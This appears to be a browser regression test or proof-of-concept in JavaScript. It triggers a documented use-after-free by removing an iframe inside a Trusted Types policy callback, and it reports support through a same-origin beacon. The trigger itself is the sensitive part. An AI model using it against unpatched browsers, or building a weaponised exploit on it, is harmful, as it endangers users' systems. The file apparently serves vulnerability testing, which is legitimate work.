// Upstream fix cb83583e5f: "Use-after-free of Document in trustedTypeCompliantString".
// Reached by removing an iframe from inside a Trusted Types policy callback while the document is still
// being consulted. Guarded by feature detection: if Trusted Types is absent or behind a flag on this
// build, the beacon says so and this case proves nothing either way.
(function () {
  function send(t) { try { navigator.sendBeacon('/beacon', t); } catch (e) {} }
  try {
    if (!('trustedTypes' in window) || !window.trustedTypes) { send('tt-unsupported'); return; }
    var target = document.createElement('div');
    target.textContent = 'x';
    var iframe = document.createElement('iframe');
    iframe.srcdoc = '<body><script>document.body.appendChild(parent.tgt);parent.innerTT=trustedTypes;<' + '/script>';
    iframe.onload = function () {
      try {
        window.trustedTypes.createPolicy('default', {
          createHTML: function () {
            document.adoptNode(target);
            iframe.remove();
            return '<b>ok</b>';
          }
        });
        document.body.innerHTML = '<b>ok</b>';
      } catch (e) { }
    };
    window.tgt = target;
    document.body.appendChild(iframe);
    send('tt-present');
  } catch (e) { send('tt-error'); }
})();
